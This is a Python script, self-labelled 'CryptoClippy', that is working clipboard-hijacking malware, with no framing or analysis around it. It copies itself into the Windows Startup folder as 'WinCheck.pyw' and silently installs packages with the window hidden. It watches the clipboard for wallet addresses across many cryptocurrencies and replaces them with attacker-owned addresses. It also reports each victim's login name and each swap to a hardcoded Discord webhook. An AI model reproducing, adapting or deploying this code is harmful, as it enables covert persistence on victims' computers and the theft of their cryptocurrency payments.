
import re
import os
import time
import random
import shutil
import subprocess
import sys

hook = 'https://discord.com/api/webhooks/1418675943748272188/IDqdUzmKu0VHzY9qMz431yaVnH64hvQ6Rnke8aX4BpV8787hEe-Xx08XSjd6gAlB3RcP' 
thecode = '''
import re
import os
import time
import random
import shutil
import subprocess
import sys

hook = 'https://discord.com/api/webhooks/1418675943748272188/IDqdUzmKu0VHzY9qMz431yaVnH64hvQ6Rnke8aX4BpV8787hEe-Xx08XSjd6gAlB3RcP' 
thecode = \'\'\'\'\'\'

appdata = os.getenv('APPDATA')
startupfolder = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
if thecode:
    with open(os.path.join(startupfolder, 'WinCheck.pyw'), 'w', encoding='utf-8') as f:
        f.write(thecode)

coinsssss = {
    'bc1qzuelyf68hjd8qwhsm43ejpk538xnvd78zml5d3'      : r'(?:bc1[a-z0-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'      : r'0x[a-fA-F0-9]{40}',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'      : r'bnb1[0-9a-z]{38}',
    'rGU8BRSuY5YLNdUcXbrNu29EQHRCR8wRSo'      : r'r[0-9a-zA-Z]{24,34}',
    'addr1qydvdugxkprrxsfxzf2r0amkz0syka5lm8spk4vgv9l0y7c6cmcsdvzxxdqjvyj5xlmhvylqfdmflk0qrd2csct77fasq5cfzg'      : r'addr1[0-9a-z]{58}',
    'F7Lr2NjDPWPMJouTHV3kasePbiL4t1MrtCCMbUgCZXYj'      : r'(?![LM3l])[1-9A-HJ-NP-Za-km-z]{43,44}(?<![LM3][1-9A-HJ-NP-Za-km-z]{33})',
    'DBBaxUBzXAZqnbaHZk8CbpZ6CVGmC1Euvn'     : r'D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}',
    'TQw5weBndhXq9mLkPDwBXeDWb7vcVDGTUk'      : r'T[A-HJ-NP-Za-km-z1-9]{33}',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'    : r'0x[a-fA-F0-9]{40}',
    'LX44QNxXmmnUsttkzdAgMubS6dQb7nHNha'      : r'(?:L[a-km-zA-HJ-NP-Z1-9]{26,33}|M[a-km-zA-HJ-NP-Z1-9]{26,33}|3[a-km-zA-HJ-NP-Z1-9]{26,33}|ltc1q[a-z0-9]{39}|ltc1p[a-z0-9]{58})(?![0-9A-Za-z])',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'     : r'0x[a-fA-F0-9]{40}',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'     : r'X-avax1[0-9a-z]{38}',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'      : r'0x[a-fA-F0-9]{40}',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'      : r'0x[a-fA-F0-9]{40}',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'     : r'0x[a-fA-F0-9]{40}',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'     : r'0x[a-fA-F0-9]{40}',
    'GA6NFYTV4GMS7YW6UQHRGSTSXACYRUK4O3Q5IKMVA62SRA4VRNKNABEY'      : r'G[A-Z2-7]{55}',
    'cosmos12d2at6hs2ewzksyfvt0a0fwqcvymm5zzj2648d'     : r'cosmos1[0-9a-z]{38}',
    '0x9575feD90Baa4eC492bb12efaA82D7d9A5c3d050'      : r'0x[a-fA-F0-9]{40}',
    '49JVqCvuipEbf5noo59mee1h7zJFhQsNQcsV3ZkUkDjDJWa8GgTV3NujCjhJGK7rSFcJacejPveGGg49fcHmHVRZ9MZGCAA'      : r'4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b': r'0x[a-fA-F0-9]{40}',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b': r'0x[a-fA-F0-9]{40}',
}

subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests'], creationflags=subprocess.CREATE_NO_WINDOW)

def launchnotif():
    if hook:
        try:
            import requests
            if hook:
                requests.post(hook, json={'content': f'``{os.getlogin()} Connected to CryptoClippy``'})
        except:
            pass

def clipnotif(old, new):
    if hook:
        try: 
            import requests
            if hook:
                requests.post(hook, json={'content': f'``{os.getlogin()} Got clipped`` ``Old - {old}`` ``New - {new}``'})
        except:
            pass

def startclipping():
    subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyperclip'], creationflags=subprocess.CREATE_NO_WINDOW)
    import pyperclip
    alladdys = [addy for addy, pattern in coinsssss.items()]

    while True:
        try:
            clipboard = pyperclip.paste().strip()
            for addy, pattern in coinsssss.items():
                if re.fullmatch(pattern, clipboard):
                    if clipboard in alladdys:
                        pass
                    else:
                        pyperclip.copy(addy)
                        clipnotif(clipboard, addy)
            time.sleep(0.25)

        except:
            time.sleep(1)

launchnotif()
startclipping()'''

appdata = os.getenv('APPDATA')
startupfolder = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
if thecode:
    with open(os.path.join(startupfolder, 'WinCheck.pyw'), 'w', encoding='utf-8') as f:
        f.write(thecode)

coinsssss = {
    'bc1qzuelyf68hjd8qwhsm43ejpk538xnvd78zml5d3'      : r'\b(?:bc1[a-z0-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'      : r'\b0x[a-fA-F0-9]{40}\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'      : r'\bbnb1[0-9a-z]{38}\b',
    'rGU8BRSuY5YLNdUcXbrNu29EQHRCR8wRSo'      : r'\br[0-9a-zA-Z]{24,34}\b',
    'addr1qydvdugxkprrxsfxzf2r0amkz0syka5lm8spk4vgv9l0y7c6cmcsdvzxxdqjvyj5xlmhvylqfdmflk0qrd2csct77fasq5cfzg'      : r'\baddr1[0-9a-z]{58}\b',
    'F7Lr2NjDPWPMJouTHV3kasePbiL4t1MrtCCMbUgCZXYj'      : r'\b(?![LM3l])[1-9A-HJ-NP-Za-km-z]{43,44}\b(?<![LM3][1-9A-HJ-NP-Za-km-z]{33})',
    'DBBaxUBzXAZqnbaHZk8CbpZ6CVGmC1Euvn'     : r'\bD[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}\b',
    'TQw5weBndhXq9mLkPDwBXeDWb7vcVDGTUk'      : r'\bT[A-HJ-NP-Za-km-z1-9]{33}\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'    : r'\b0x[a-fA-F0-9]{40}\b',
    'LX44QNxXmmnUsttkzdAgMubS6dQb7nHNha'      : r'\b(?:L[a-km-zA-HJ-NP-Z1-9]{26,33}|M[a-km-zA-HJ-NP-Z1-9]{26,33}|3[a-km-zA-HJ-NP-Z1-9]{26,33}|ltc1q[a-z0-9]{39}|ltc1p[a-z0-9]{58})\b(?![0-9A-Za-z])',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'     : r'\b0x[a-fA-F0-9]{40}\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'     : r'\bX-avax1[0-9a-z]{38}\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'      : r'\b0x[a-fA-F0-9]{40}\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'      : r'\b0x[a-fA-F0-9]{40}\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'     : r'\b0x[a-fA-F0-9]{40}\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'     : r'\b0x[a-fA-F0-9]{40}\b',
    'GA6NFYTV4GMS7YW6UQHRGSTSXACYRUK4O3Q5IKMVA62SRA4VRNKNABEY'      : r'\bG[A-Z2-7]{55}\b',
    'cosmos12d2at6hs2ewzksyfvt0a0fwqcvymm5zzj2648d'     : r'\bcosmos1[0-9a-z]{38}\b',
    '0x9575feD90Baa4eC492bb12efaA82D7d9A5c3d050'      : r'\b0x[a-fA-F0-9]{40}\b',
    '49JVqCvuipEbf5noo59mee1h7zJFhQsNQcsV3ZkUkDjDJWa8GgTV3NujCjhJGK7rSFcJacejPveGGg49fcHmHVRZ9MZGCAA'      : r'\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b': r'\b0x[a-fA-F0-9]{40}\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b': r'\b0x[a-fA-F0-9]{40}\b',
}

subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests'], creationflags=subprocess.CREATE_NO_WINDOW)

def launchnotif():
    if hook:
        try:
            import requests
            if hook:
                requests.post(hook, json={'content': f'``{os.getlogin()} Connected to CryptoClippy``'})
        except:
            pass

def clipnotif(old, new):
    if hook:
        try: 
            import requests
            if hook:
                requests.post(hook, json={'content': f'``{os.getlogin()} Got clipped`` ``Old - {old}`` ``New - {new}``'})
        except:
            pass

def startclipping():
    subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyperclip'], creationflags=subprocess.CREATE_NO_WINDOW)
    import pyperclip
    alladdys = [addy for addy, pattern in coinsssss.items()]

    while True:
        try:
            clipboard = pyperclip.paste().strip()
            for addy, pattern in coinsssss.items():
                if re.fullmatch(pattern, clipboard):
                    if clipboard in alladdys:
                        pass
                    else:
                        pyperclip.copy(addy)
                        clipnotif(clipboard, addy)
            time.sleep(0.25)

        except:
            time.sleep(1)

launchnotif()
startclipping()